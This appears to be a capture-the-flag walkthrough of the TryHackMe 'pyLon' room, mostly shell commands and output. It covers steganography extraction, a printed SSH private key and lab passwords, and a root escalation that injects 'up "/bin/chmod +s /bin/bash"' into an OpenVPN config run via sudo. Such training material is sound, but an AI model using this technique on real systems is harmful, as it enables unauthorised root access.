----
Can you penetrate the defenses and become root?
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/715d827a2967ada237e63a92c6ea2cd6.png)

### Task 1  recon

 Download Task Files

After rummaging through a colleages drawer during a security audit, you find a USB key with an interesting file, you think its hiding something, use the data on the key to penetrate his workstation, and become root.

This room contains steganography and may be difficult. If you are finding it difficult to overcome, read the hint for flag 1.

Being able to analyse a file and determine its contents is important. Once you extract the hidden file in the image, there will be further work to do.

Remember, password reuse is bad practice.

Answer the questions below

I have downloaded the file

Correct Answer


I have extracted the hidden file with steghide.

steghide extract -sf pepper.jpg

 Completed

### Task 2  pyLon

 Start Machine

You extracted some files, and now you will attempt to penetrate the system.

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ stegseek pepper.jpg /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "pepper"           

[i] Original filename: "lone".
[i] Extracting to "pepper.jpg.out".

┌──(witty㉿kali)-[~/Downloads]
└─$ cat pepper.jpg.out 
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
7Xa73W632+12/5XfActiLj0AKAAA

┌──(witty㉿kali)-[~/Downloads]
└─$ exiftool pepper.jpg                                 
ExifTool Version Number         : 12.57
File Name                       : pepper.jpg
Directory                       : .
File Size                       : 390 kB
File Modification Date/Time     : 2023:07:30 19:39:04-04:00
File Access Date/Time           : 2023:07:30 19:39:33-04:00
File Inode Change Date/Time     : 2023:07:30 19:39:07-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
XMP Toolkit                     : Image::ExifTool 12.16
Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)
Image Width                     : 2551
Image Height                    : 1913
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2551x1913
Megapixels                      : 4.9

┌──(witty㉿kali)-[~/Downloads]
└─$ base64 -d pepper.jpg.out > lone_decoded 
                                                                              
┌──(witty㉿kali)-[~/Downloads]
└─$ file lone_decoded 
lone_decoded: gzip compressed data, from Unix, original size modulo 2^32 10240
                                                                              
┌──(witty㉿kali)-[~/Downloads]
└─$ mv lone_decoded lone_decoded.gz 
                                                                              
┌──(witty㉿kali)-[~/Downloads]
└─$ gunzip lone_decoded.gz                                 
                                                                              
┌──(witty㉿kali)-[~/Downloads]
└─$ file lone_decoded
lone_decoded: POSIX tar archive (GNU)
                                                                              
┌──(witty㉿kali)-[~/Downloads]
└─$ tar -xf lone_decoded
                                                                              
┌──(witty㉿kali)-[~/Downloads]
└─$ cat lone_id 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA45nVhEtT37sKnNBWH2VYsXbjA8vAK8e04HfrgF06NiGGQsRBLtJw
YJu73+zGO0AoETo8LYhxB5eI5D9KzboGuTDAuGZQuUq+8N/hBmfavieHLHgkRNBr0ErJ60
l2FAcDW6pDowfiwC1vsdixQ6L8kvVhdkz0GUfPAlfIRhHHtQaQnQ7wnRtdGjIPK9/S1MPs
IJOLD2S79NxS7vguw87Mp0cnRjDalaCcRE0ELUvLDKQdZlWba0kF/PciqknkDYq2mbkCRd
3jWX2Umx0WtP2wCh9BQ/syxTJDXn6mCEsoNI/roLKyB1uGms/pFiBxS0qdiZAAO6CyTkyG
hZwb1BKmUwAAA8hSynq9Usp6vQAAAAdzc2gtcnNhAAABAQDjmdWES1Pfuwqc0FYfZVixdu
MDy8Arx7Tgd+uAXTo2IYZCxEEu0nBgm7vf7MY7QCgROjwtiHEHl4jkP0rNuga5MMC4ZlC5
Sr7w3+EGZ9q+J4cseCRE0GvQSsnrSXYUBwNbqkOjB+LALW+x2LFDovyS9WF2TPQZR88CV8
hGEce1BpCdDvCdG10aMg8r39LUw+wgk4sPZLv03FLu+C7DzsynRydGMNqVoJxETQQtS8sM
pB1mVZtrSQX89yKqSeQNiraZuQJF3eNZfZSbHRa0/bAKH0FD+zLFMkNefqYISyg0j+ugsr
IHW4aaz+kWIHFLSp2JkAA7oLJOTIaFnBvUEqZTAAAAAwEAAQAAAQB+u03U2EzfqzqBjtAl
szzrtBM8LdvXhOAGjT+ovkCHm6syyiyxcaP5Zz35tdG7dEHbNd4ETJEDdTFYRpXUb90GiU
sGYpJYWnJvlXmrI3D9qOzvqgYn+xXNaZd9V+5TwIPyKqB2yxFLiQFEujAaRUr2WYPnZ3oU
CZQO7eoqegQFm5FXLy0zl0elAkEiDrrpS5CNBunv297nHMLFBPIEB231MNbYMDe0SU40NQ
WAGELdiAQ9i7N/SMjAJYAV2MAjbbzp5uKDUNxb3An85rUWKHXslATDh25abIY0aGZHLP5x
4B1usmPPLxGTqX19Cm65tkw8ijM6AM9+y4TNj2i3GlQBAAAAgQDN+26ilDtKImrPBv+Akg
tjsKLL005RLPtKQAlnqYfRJP1xLKKz7ocYdulaYm0syosY+caIzAVcN6lnFoBrzTZ23uwy
VB0ZsRL/9crywFn9xAE9Svbn6CxGBYQVO6xVCp+GiIXQZHpY7CMVBdANh/EJmGfCJ/gGby
mut7uOWmfiJAAAAIEA9ak9av7YunWLnDp6ZyUfaRAocSPxt2Ez8+j6m+gwYst+v8cLJ2SJ
duq0tgz7za8wNrUN3gXAgDzg4VsBUKLS3i41h1DmgqUE5SWgHrhIJw9AL1fo4YumPUkB/0
S0QMUn16v4S/fnHgZY5KDKSl4hRre5byrsaVK0oluiKsouR4EAAACBAO0uA2IvlaUcSerC
0OMkML9kGZA7uA52HKR9ZE/B4HR9QQKN4sZ+gOPfiQcuKYaDrfmRCeLddrtIulqY4amVcR
nx3u2SBx9KM6uqA2w80UlqJb8BVyM4SscUoHdmbqc9Wx5f+nG5Ab8EPPq0FNPrzrBJP5m0
43kcLdLe8Jv/ETfTAAAAC3B5bG9uQHB5bG9uAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----


┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.151.186 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.151.186:22
Open 10.10.151.186:222
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-30 19:45 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:45
Completed Parallel DNS resolution of 1 host. at 19:45, 0.02s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:45
Scanning 10.10.151.186 [2 ports]
Discovered open port 22/tcp on 10.10.151.186
Discovered open port 222/tcp on 10.10.151.186
Completed Connect Scan at 19:45, 0.24s elapsed (2 total ports)
Initiating Service scan at 19:45
Scanning 2 services on 10.10.151.186
Completed Service scan at 19:45, 0.55s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.151.186.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 7.87s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
Nmap scan report for 10.10.151.186
Host is up, received user-set (0.24s latency).
Scanned at 2023-07-30 19:45:14 EDT for 9s

PORT    STATE SERVICE REASON  VERSION
22/tcp  open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 129fae2df8af04bc8d6e2d5566a8b755 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC48TQ2bNsfSzCnjiLLFrhPxsQFtcf4tlGCuD9FFnqSRngeiwGx5OYXmVpTmZ3oQBlg09xQZHhOx0HG1w9wQTeGNfrJ3HbI7Ne4gzCXeNacwNrPwa9kQ4Jhe90rXUGbsnjwrSTXSe/j2vEIDOPo+nlP7HJZBMvzPR8YohRxpn/zmA+1/yldVDueib64A3bwaKZ/bjFs8PvY4kRCwaFF3j0vhHT5bteQWqllpJXOYMe/kXiHa8pZoSamp+fNQm7lxIpXZhcw13cXWauVftAMloIfuOJQnOxmexbCbC0D0LTj/W1KdYIXcw9+4HdNn+R0wFFgOWfL49ImnGeZvIz+/KV7
|   256 ce65ebce9f3f57166a79459dd3d2ebf2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAngdr5IauC530BNjl20lrHWKkcbrDv4sx0cCN3LDhz01JHzSrlxO4+4JizUGzK/nY/RUY1w5iyv9w9cp4cayVc=
|   256 6c3ba7023fa9cd83f2b9466cd0d6e6ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIxQ6Fpj73z02s4gj/3thP3O1xXMmVp60yt1Ff7wObmh
222/tcp open  ssh     syn-ack OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 39e1e40eb5408ab9e0ded06e7882e828 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCWmYY++QRFaOM4hlW77VN6PvZcLVj1gqoBUnqRt3WbbrYUzwe9nBU4YdM6LN1d57KrNuzZyrvjS2+9V9Wz7AtsiBGz+7rOMejT4A3hz6GdMUZwAZ7jhDEqqYV/BDP+xcadiLuHWnYFyeSy1xLhVRtZsnU8bXCg9+meHv6PBMq6+TFK5zkmYXBshEyj8LpH9MRGXlwHREkbAcllAr0gNRTrJpwI4/r/O//V6TIA1wyLoDZtYQABVsVoGd9R0vu++HLrNI9+NBi7BVyUvOSkQmsoFNAkMslZv9S7TOG/VQQOrJMjRY/EGPu6JwLHmpd+Kf3q6cOrCjfQOXRo+UaD/E0cfNClCXlJPAa3t8SzqYBK7ebkCwF7fifuOH7vIGgioN9jJNYzcB1hlLcfuBhv69qpe99DL7C4Qqk0ftv9TQgx945JhQiq2LH90eYDUGXmVu0wKLu4mfMfLSUYYgXEZGNkqIW/IM13wagN1FHZBNMsyR1/f/O9igD/qEt0KT70Zfs=
|   256 17a25bae4e4420fb28586b56343a14b3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICwLlQimfX4lrWWdFenHEWZgUWVWRQj1Mt0L4IBeeTnJ
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:45
Completed NSE at 19:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ chmod 600 lone_id   

https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)&input=cGVwcGVy

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -i lone_id lone@10.10.151.186                   
The authenticity of host '10.10.151.186 (10.10.151.186)' can't be established.
ED25519 key fingerprint is SHA256:a4J2LwSwZl59RFhvrfKuRiFGA2RDy+i9GN/nNgd2b44.
This key is not known by any other names.
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

[*] Encryption key exists in database.

Enter your encryption key: 2_[-I2_[0E2DmEK

      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] Decrypt a password.
        [2] Create new password.
        [3] Delete a password.
        [4] Search passwords.
        

Select an option [Q] to Quit: 1

                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

         SITE                        USERNAME
 [1]     pylon.thm                   lone                        
 [2]     FLAG 1                      FLAG 1   

                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for pylon.thm

        Username = lone
        Password = +2BRkRuE!w7>ozQ4  

                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for FLAG 1

        Username = FLAG 1
        Password = THM{homebrew_password_manager}    

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh lone@10.10.151.186
lone@10.10.151.186's password: 
Welcome to
                   /
       __         /       __    __
     /   ) /   / /      /   ) /   )
    /___/ (___/ /____/ (___/ /   /
   /         /
  /      (_ /       by LeonM

Last login: Sun Jul 30 23:52:32 2023 from 10.8.19.103
lone@pylon:~$ id
uid=1002(lone) gid=1002(lone) groups=1002(lone)
lone@pylon:~$ ls
note_from_pood.gpg  pylon  user1.txt
lone@pylon:~$ cat user1.txt
TMM{easy_does_it}

lone@pylon:~$ cat /etc/passwd | grep "\/home"
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
pylon:x:1000:1000:pylon:/home/pylon:/bin/bash
pood:x:1001:1001:poo D,,,:/home/pood:/bin/bash
lone:x:1002:1002:lon E,,,:/home/lone:/bin/bash

lone@pylon:~$ sudo -l
[sudo] password for lone: 
Matching Defaults entries for lone on pylon:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lone may run the following commands on pylon:
    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn

lone@pylon:~/pylon$ ls -lah
total 40K
drwxr-xr-x 3 lone lone 4.0K Jan 30  2021 .
drwxr-x--- 6 lone lone 4.0K Jan 30  2021 ..
drwxrwxr-x 8 lone lone 4.0K Jan 30  2021 .git
-rw-rw-r-- 1 lone lone  793 Jan 30  2021 README.txt
-rw-rw-r-- 1 lone lone  340 Jan 30  2021 banner.b64
-rwxrwxr-x 1 lone lone 8.3K Jan 30  2021 pyLon.py
-rw-rw-r-- 1 lone lone 2.2K Jan 30  2021 pyLon_crypt.py
-rw-rw-r-- 1 lone lone 3.9K Jan 30  2021 pyLon_db.py

lone@pylon:~/pylon/.git$ git log
commit 73ba9ed2eec34a1626940f57c9a3145f5bdfd452 (HEAD, master)
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:55:46 2021 +0000

    actual release! whoops

commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!

lone@pylon:~/pylon/.git$ cd ..
lone@pylon:~/pylon$ ls
README.txt  banner.b64  pyLon.py  pyLon_crypt.py  pyLon_db.py
lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Previous HEAD position was 73ba9ed actual release! whoops
HEAD is now at cfc14d5 Initial commit!
lone@pylon:~/pylon$ ls
README.txt  banner.b64  pyLon.db  pyLon_crypt.py  pyLon_db.py  pyLon_pwMan.py

┌──(witty㉿kali)-[~/Downloads]
└─$ wget http://10.10.151.186:8000/pyLon.db
--2023-07-30 19:58:58--  http://10.10.151.186:8000/pyLon.db
Connecting to 10.10.151.186:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12288 (12K) [application/octet-stream]
Saving to: ‘pyLon.db’

pyLon.db              100%[========================>]  12.00K  --.-KB/s    in 0s      

2023-07-30 19:58:59 (27.7 MB/s) - ‘pyLon.db’ saved [12288/12288]


lone@pylon:~/pylon$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.19.103 - - [30/Jul/2023 23:59:01] "GET /pyLon.db HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/Downloads]
└─$ file pyLon.db                           
pyLon.db: SQLite 3.x database, last written using SQLite version 3022000, file counter 4, database pages 3, cookie 0x2, schema 4, UTF-8, version-valid-for 4

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlite3 pyLon.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
pwCheck  pwMan  
sqlite> SELECT * FROM pwMan;
pylon.thm_gpg_key|lone_gpg_key|40703ac897fd8cfdffc97947981e88a1
sqlite> SELECT * FROM pwCheck;
fc37a9f7a6115a98d549b52a42c8e3a9a83849edbb448b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db

┌──(witty㉿kali)-[~/Downloads]
└─$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: fc37a9f7a6115a98d549b52a42c8e3a9a83849edbb448b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------

┌──(witty㉿kali)-[~/Downloads]
└─$ echo "fc37a9f7a6115a98d549b52a42c8e3a9a83849edbb448b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db" > hash_pylon
                                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512 hash_pylon
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 128/128 AVX 2x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:36 DONE (2023-07-30 20:05) 0g/s 397333p/s 397333c/s 397333C/s !)!)&*T..*7¡Vamos!
Session completed. 

nope

                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

[*] Encryption key correct.  2_[-I2_[0E2DmEK
[*] Initialization complete.

same pass

               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] List passwords.
        [2] Decrypt a password.
        [3] Create new password.
        [4] Delete a password.
        [5] Search passwords.
        [6] Display help menu

select 6

     __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

         SITE                        USERNAME
 [1]     pylon.thm_gpg_key           lone_gpg_key                

Select a password [C] to cancel: 1 


                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for pylon.thm_gpg_key

        Username = lone_gpg_key
        Password = zr7R0T]6zvYl*~OD            

[*] Install xclip to copy to clipboard.
[*] sudo apt install xclip

[*] Password copied to the clipboard.

lone@pylon:~$ gpg -d note_from_pood.gpg
gpg: Note: secret key D83FA5A7160FFE57 expired at Fri Jan 27 19:13:48 2023 UTC
gpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 2021-01-27
      "lon E <lone@pylon.thm>"
Hi Lone,

Can you please fix the openvpn config?

It's not behaving itself again.

oh, by the way, my password is yn0ouE9JLR3h)`=I

Thanks again.


      ┌────────────────────────────────────────────────────────────────┐
      │ Please enter the passphrase to unlock the OpenPGP secret key:  │
      │ "lon E <lone@pylon.thm>"                                       │
      │ 3072-bit RSA key, ID D83FA5A7160FFE57,                         │
      │ created 2021-01-27 (main key ID EA097FFFA0996DAA).             │
      │                                                                │
      │                                                                │
      │ Passphrase: ****************__________________________________ │
      │                                                                │
      │         <OK>                                    <Cancel>       │
      └────────────────────────────────────────────────────────────────┘

lone@pylon:~$ su pood
Password: 
pood@pylon:/home/lone$ cd ..
pood@pylon:/home$ cd pood/
pood@pylon:~$ ls
user2.txt
pood@pylon:~$ cat user2.txt 
THM{homebrew_encryption_lol}

pood@pylon:~$ sudo -l
[sudo] password for pood: 
Matching Defaults entries for pood on pylon:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn

pood@pylon:~$ sudoedit /opt/openvpn/client.ovpn

client
dev tun
proto udp
remote 127.0.0.1 1194
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
cipher AES-256-CBC

<ca>
-----BEGIN CERTIFICATE-----
MIIDOTCCAiGgAwIBAgIUGuqk4ASrTBBqFmuR8uMckCYOVTQwDQYJKoZIhvcNAQEL

https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da

pood@pylon:~$ sudoedit /opt/openvpn/client.ovpn

client
dev tun
script-security 2
up "/bin/chmod +s /bin/bash"
proto udp

pood@pylon:~$ exit
exit
lone@pylon:~$ sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
[sudo] password for lone: 
Mon Jul 31 00:17:18 2023 OpenVPN 2.4.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2019
Mon Jul 31 00:17:18 2023 library versions: OpenSSL 1.1.1  11 Sep 2018, LZO 2.08
Mon Jul 31 00:17:18 2023 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
Mon Jul 31 00:17:18 2023 TCP/UDP: Preserving recently used remote address: [AF_INET]127.0.0.1:1194
Mon Jul 31 00:17:18 2023 UDP link local: (not bound)
Mon Jul 31 00:17:18 2023 UDP link remote: [AF_INET]127.0.0.1:1194
Mon Jul 31 00:17:18 2023 [server] Peer Connection Initiated with [AF_INET]127.0.0.1:1194
Mon Jul 31 00:17:19 2023 TUN/TAP device tun1 opened
Mon Jul 31 00:17:19 2023 do_ifconfig, tt->did_ifconfig_ipv6_setup=0
Mon Jul 31 00:17:19 2023 /sbin/ip link set dev tun1 up mtu 1500
Mon Jul 31 00:17:19 2023 /sbin/ip addr add dev tun1 local 172.31.12.6 peer 172.31.12.5
Mon Jul 31 00:17:19 2023 /bin/chmod +s /bin/bash tun1 1500 1552 172.31.12.6 172.31.12.5 init
/bin/chmod: cannot access 'tun1': No such file or directory
/bin/chmod: cannot access '1500': No such file or directory
/bin/chmod: cannot access '1552': No such file or directory
/bin/chmod: cannot access '172.31.12.6': No such file or directory
/bin/chmod: cannot access '172.31.12.5': No such file or directory
/bin/chmod: cannot access 'init': No such file or directory
Mon Jul 31 00:17:19 2023 WARNING: Failed running command (--up/--down): external program exited with error status: 1
Mon Jul 31 00:17:19 2023 Exiting due to fatal error

lone@pylon:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash

lone@pylon:~$ bash -p
bash-4.4# id
uid=1002(lone) gid=1002(lone) euid=0(root) egid=0(root) groups=0(root),1002(lone)

bash-4.4# gpg -d root.txt.gpg
gpg: can't open 'root.txt.gpg': Permission denied
gpg: decrypt_message failed: Permission denied

┌──(witty㉿kali)-[~/Downloads]
└─$ openssl passwd -6 -salt abc password
$6$abc$rvqzMBuMVukmply9mZJpW0wJMdDfgUKLDrSNxf9l66h/ytQiKNAdqHSj5YPJpxWJpVjRXibQXRddCl9xYHQnd0

